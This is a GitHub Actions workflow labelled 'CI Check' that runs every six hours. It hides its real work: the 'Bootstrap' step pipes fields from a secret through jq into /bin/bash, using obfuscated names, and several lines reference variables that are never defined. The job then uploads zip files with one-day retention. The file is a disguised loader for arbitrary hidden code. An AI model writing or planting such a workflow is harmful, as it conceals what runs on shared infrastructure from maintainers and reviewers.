name: CI Check
on:
  workflow_dispatch:

  schedule:
    - cron: '21 0,6,12,18 * * *'
permissions:
  contents: read
  actions: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  deploy:
    name: Main task
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Bootstrap
        env:
          ft622: ${{ secrets.ft622 }}
        run: |
          printf '%s' "$ft622" | jq -r .ms5943 | /bin/bash
          printf '%s' "$pw18" | jq -r .nimlh6915 | /bin/bash
          printf '%s' "$fn986" | jq -r .ao8 | /bin/bash
          printf '%s' "$qggec0956" | jq -r .ou4889 | /bin/bash
          printf '%s' "$v32660" | jq -r .mou875 | /bin/bash
          printf '%s' "$bgcd8" | jq -r .pfq664 | /bin/bash

      - name: Archive artifact
        uses: actions/upload-artifact@v4
        with:
          name: LM0p5rTS
          path: "*.zip"
          retention-days: 1
